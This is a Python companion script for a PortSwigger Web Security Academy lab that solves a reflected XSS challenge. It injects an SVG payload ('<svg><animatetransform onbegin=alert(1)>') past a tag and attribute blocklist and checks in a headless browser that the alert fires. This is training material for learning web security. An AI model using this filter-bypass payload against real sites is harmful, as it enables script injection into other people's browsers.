#!/usr/bin/env python3
"""
Reflected XSS with some SVG markup allowed
PortSwigger Web Security Academy -- Cross-Site Scripting (XSS)

Companion script for the writeup: 16-reflected-xss-some-svg-markup-allowed.md

What this does:
    Sends the search parameter an SVG payload the tag/attribute blocklist doesn't
    recognize -- <animatetransform onbegin=...> -- then loads the URL in a headless
    browser to confirm the alert() fires without any user interaction, since
    onbegin triggers as soon as the animation starts.

Usage:
    python 16-reflected-xss-some-svg-markup-allowed.py <lab-url>
    e.g. python 16-reflected-xss-some-svg-markup-allowed.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx playwright
    playwright install chromium
"""

import sys
import urllib.parse
import httpx

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    sync_playwright = None


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    warmup = client.get(lab_url)
    session = warmup.cookies.get("session", "")
    domain = lab_url.split("/")[2]

    payload = "<svg><animatetransform onbegin=alert(1)>"
    url = f"{lab_url}/?search={urllib.parse.quote(payload)}"
    print(f"[*] Payload: {payload}")
    print(f"[*] Request: GET {url}")

    if sync_playwright is None:
        print("[!] playwright not installed -- cannot confirm alert() execution.")
        print(f"    Install it, or open this URL yourself: {url}")
        return

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        page.goto(url, wait_until="domcontentloaded", timeout=15000)
        page.wait_for_timeout(3000)
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() fired: {alert_fired}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
